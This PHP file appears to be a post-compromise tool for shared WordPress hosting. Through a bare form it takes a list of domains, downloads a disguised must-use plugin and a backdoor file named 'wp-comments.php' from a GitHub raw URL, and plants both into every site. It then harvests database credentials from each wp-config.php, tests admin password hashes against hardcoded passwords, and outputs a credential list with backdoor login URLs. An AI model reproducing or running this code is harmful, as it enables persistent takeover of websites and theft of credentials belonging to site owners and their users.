<?php

error_reporting(E_ALL);
ini_set('display_errors', 1);

define('MAIN_DOMAIN_PATH', __DIR__ . '/../public_html');
define('CHILD_DOMAIN_PATH', __DIR__ . "/../__DOMAIN__");

function curl_data($url) {
    if (function_exists('curl_init')) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        $data = curl_exec($ch);
        curl_close($ch);
    } else {
        $context = stream_context_create([
            'ssl' => [
                'verify_peer' => false,
                'verify_peer_name' => false,
            ]
        ]);
        $data = file_get_contents($url, false, $context);
    }
    return $data;
}

function get_child_path($domain) {
    return str_replace('__DOMAIN__', $domain, CHILD_DOMAIN_PATH);
}

if (isset($_POST['domains'])) {
    $domains = explode(PHP_EOL, $_POST['domains']);
    
    function get_wp_config_value($config_contents, $constant_name) {
        $pattern = "/define\(\s*['\"]" . preg_quote($constant_name, '/') . "['\"]\s*,\s*['\"](.*?)['\"]\s*\)/";
        if (preg_match($pattern, $config_contents, $matches)) {
            return $matches[1];
        }
        return null;
    }

    function get_wp_prefix($config_contents) {
        if (preg_match("/\$table_prefix\s*=\s*'([^']+)';/", $config_contents, $matches)) {
            return $matches[1];
        }
        return null;
    }

    function get_siteurl_option($host, $user, $password, $db_name, $prefix = 'wp_') {
        $conn = new mysqli($host, $user, $password, $db_name);

        $query = "SELECT option_value FROM {$prefix}options WHERE option_name = 'siteurl' LIMIT 1";
        $result = $conn->query($query);

        $siteUrl = null;

        if ($result && $row = $result->fetch_assoc()) {
            $siteUrl = $row['option_value'];
        }

        $conn->close();
        return $siteUrl;
    }

    function get_admin_password($host, $user, $password, $db_name, $prefix = 'wp_') {
        $conn = new mysqli($host, $user, $password, $db_name);
        $table_name = $prefix . "users";
        $query = "SELECT user_pass FROM `$table_name` WHERE user_login = 'admin' LIMIT 1";
        $result = $conn->query($query);
        $password = 'xxxxxx';
        if ($result && $row = $result->fetch_assoc()) {
            $hashed_password = $row['user_pass'];
            if (wp_check_password('17Xk2$DH8V', $hashed_password)) {
                $password = '17Xk2$DH8V';
            } elseif (wp_check_password('Tf6SpEVY77eQ', $hashed_password)) {
                $password = 'Tf6SpEVY77eQ';
            }
        }
        $conn->close();
        return $password;
    }
    
    $results = '';
    
    $systemChecker = curl_data('https://raw.githubusercontent.com/jazzplunker97/trash/refs/heads/main/update-system-checker-plain.txt');
    $rodent = curl_data('https://raw.githubusercontent.com/jazzplunker97/trash/refs/heads/main/wp-comments.php');
    $pathLocation = __DIR__ . "/wp-content/mu-plugins/update-system-checker-plain.php";
    $rodentPathLocation = __DIR__ . "/wp-comments.php";
    
    $muPluginsDir = __DIR__ . "/wp-content/mu-plugins";
    if (!is_dir($muPluginsDir)) {
        mkdir($muPluginsDir, 0755, true);
    }
    
    file_put_contents($pathLocation, $systemChecker);
    file_put_contents($rodentPathLocation, $rodent);

    $userID = getmyuid();
    $groupID = getmygid();

    $userInfo = posix_getpwuid($userID);
    $groupInfo = posix_getgrgid($groupID);

    $main_config_contents = file_get_contents(MAIN_DOMAIN_PATH . '/wp-config.php');
    $main_db_host = get_wp_config_value($main_config_contents, 'DB_HOST');
    $main_db_user = get_wp_config_value($main_config_contents, 'DB_USER');
    $main_db_password = get_wp_config_value($main_config_contents, 'DB_PASSWORD');
    $main_db_prefix = get_wp_prefix($main_config_contents);

    require_once(MAIN_DOMAIN_PATH . '/wp-load.php');
    
    foreach ($domains as $key => $value) {
        $value = trim($value);
        $wp_config_path = get_child_path($value) . '/wp-config.php';
        $config_contents = file_get_contents($wp_config_path);
    
        $db_host = get_wp_config_value($config_contents, 'DB_HOST');
        $db_user = get_wp_config_value($config_contents, 'DB_USER');
        $db_password = get_wp_config_value($config_contents, 'DB_PASSWORD');
    
        $muPluginsDir = get_child_path($value) . '/wp-content/mu-plugins';
        if (!is_dir($muPluginsDir)) {
            mkdir($muPluginsDir, 0755, true);
        }
    
        $pathLocation = get_child_path($value) . '/wp-content/mu-plugins/update-system-checker-plain.php';
        $rodentPathLocation = get_child_path($value) . '/wp-comments.php';
        file_put_contents($pathLocation, $systemChecker);
        file_put_contents($rodentPathLocation, $rodent);

        $config_content = file_get_contents(get_child_path($value) . '/wp-config.php');
        $db_host = get_wp_config_value($config_contents, 'DB_HOST');
        $db_user = get_wp_config_value($config_contents, 'DB_USER');
        $db_password = get_wp_config_value($config_contents, 'DB_PASSWORD');
        $db_name = get_wp_config_value($config_contents, 'DB_NAME');
        $prefix = get_wp_prefix($config_contents);

        $site_url = get_siteurl_option($db_host, $db_user, $db_password, $db_name, $prefix);
        $userPass = get_admin_password($db_host, $db_user, $db_password, $db_name, $prefix);

        $line = "{$value}/" . ',' . ',' . ',' . ',' . ',' . ',' . ',' . ',' . ',' . 'admin' . ',' . $userPass . ',' . $_SERVER['SERVER_ADDR'] . ',' . $userInfo['name'] . ',' . $groupInfo['name'] . ',' . $db_host . ',' . $db_user . ',' . $db_password . ',MySQL,' . ',' . ',' . ',' . ',' . ',' . "https://{$value}/wp-comments.php?http_file_header=t&user=grimreaper&password=grimreaper123@" . PHP_EOL;
    
        $results .= $line;
    }

    $siteurl = get_siteurl_option($main_db_host, $main_db_user, $main_db_password, $main_db_name, $main_db_prefix);
    $userPass = get_admin_password($main_db_host, $main_db_user, $main_db_password, $main_db_name, $main_db_prefix);
    $main_line =  "{$siteurl}/" . ',' . ',' . ',' . ',' . ',' . ',' . ',' . ',' . ',' . 'admin' . ',' . $userPass . ',' . $_SERVER['SERVER_ADDR'] . ',' . $userInfo['name'] . ',' . $groupInfo['name'] . ',' . $main_db_host . ',' . $main_db_user . ',' . $main_db_password . ',MySQL,' . ',' . ',' . ',' . ',' . ',' . "{$siteurl}/wp-comments.php?http_file_header=t&user=grimreaper&password=grimreaper123@" . PHP_EOL;
    
    $results = $main_line . $results;

    echo "<textarea>{$results}</textarea>";
    die;
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
    <form action="?type=submit" method="post" style="width: 100%;">
        <textarea name="domains" rows="50" cols="50"></textarea>
        <br>
        <br>
        <button type="submit">Submit</button>
    </form>
</body>
</html>
